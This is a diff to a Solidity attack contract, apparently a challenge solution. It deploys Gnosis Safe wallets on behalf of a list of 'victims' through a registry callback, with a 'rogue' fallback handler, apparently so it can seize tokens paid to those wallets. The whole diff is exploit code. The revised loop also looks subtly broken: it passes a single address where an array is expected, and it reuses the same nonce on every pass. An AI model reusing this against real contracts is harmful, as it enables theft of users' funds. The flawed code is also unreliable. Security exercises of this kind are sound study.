@@ -19,7 +19,7 @@ contract WalletCreator {
 
     WalletRegistry immutable walletRegistry;
 
-    address[4] private _victims;
+    address[] private _victims;
 
     uint256 private constant MAX_THRESHOLD = 1;
 
@@ -27,7 +27,7 @@ contract WalletCreator {
         address gnosisSafeMasterCopy_,
         address gnosisSafeProxyFactory_,
         WalletRegistry walletRegistry_,
-        address[4] memory victims_,
+        address[] memory victims_,
         address fallbackHandler_,
         address paymentToken_
     ) {
@@ -42,47 +42,36 @@ contract WalletCreator {
     // Safes created via the official interfaces use the DefaultCallbackHandler as their fallback handler.
     // A fallback handler can be replaced or extended anytime via a regular Safe transaction
     // (respecting threshold and owners of the Safe).
-    function createGnosisSafeWallet(
-        address to,
-        bytes memory data,
-        uint256 payment,
-        address payable paymentReceiver
-    ) public {
-        // Encode the data for the GnosisSafe "setup" function call
-        /// @dev Setup function sets initial storage of contract.
-        /// @param _owners List of Safe owners.
-        /// @param _threshold Number of required confirmations for a Safe transaction.
-        /// @param to Contract address for optional delegate call.
-        /// @param data Data payload for optional delegate call.
-        /// @param fallbackHandler Handler for fallback calls to this contract
-        /// @param paymentToken Token that should be used for the payment (0 is ETH)
-        /// @param payment Value that should be paid
-        /// @param paymentReceiver Address that should receive the payment (or 0 if tx.origin)
-        bytes memory initializer = abi.encodeWithSignature(
-            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
-            _victims,
-            MAX_THRESHOLD,
-            to,
-            data,
-            // We need a fallback that's rogue
-            fallbackHandler,
-            paymentToken,
-            payment,
-            paymentReceiver
-        );
-
-        // Create a unique nonce for the proxy contract
-        uint256 saltNonce = uint256(
-            keccak256(abi.encodePacked(block.timestamp, msg.sender))
-        );
-
-        // Call the createProxyWithCallback function to create the proxy contract
-        GnosisSafeProxy proxy = GnosisSafeProxyFactory(gnosisSafeProxyFactory)
-            .createProxyWithCallback(
-                address(gnosisSafeMasterCopy), // The singleton contract
-                initializer, // The initializer data
-                saltNonce, // The nonce
-                walletRegistry // The callback contract
+    function createGnosisSafeWallet() public {
+        uint256 counter = 0;
+        for (counter; counter < _victims.length; counter++) {
+            //  await safe.setup([user1.address, user2.address], 1, AddressZero, "0x", handler.address, AddressZero, 0, AddressZero)
+            bytes memory initializer = abi.encodeWithSignature(
+                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+                _victims[counter],
+                MAX_THRESHOLD,
+                address(0),
+                0x0,
+                fallbackHandler,
+                address(0),
+                0,
+                address(0)
             );
+
+            // Create a unique nonce for the proxy contract
+            uint256 saltNonce = uint256(
+                keccak256(abi.encodePacked(block.timestamp, msg.sender))
+            );
+
+            // Call the createProxyWithCallback function to create the proxy contract
+            GnosisSafeProxy proxy = GnosisSafeProxyFactory(
+                gnosisSafeProxyFactory
+            ).createProxyWithCallback(
+                    address(gnosisSafeMasterCopy), // The singleton contract
+                    initializer, // The initializer data
+                    saltNonce, // The nonce
+                    walletRegistry // The callback contract
+                );
+        }
     }
 }
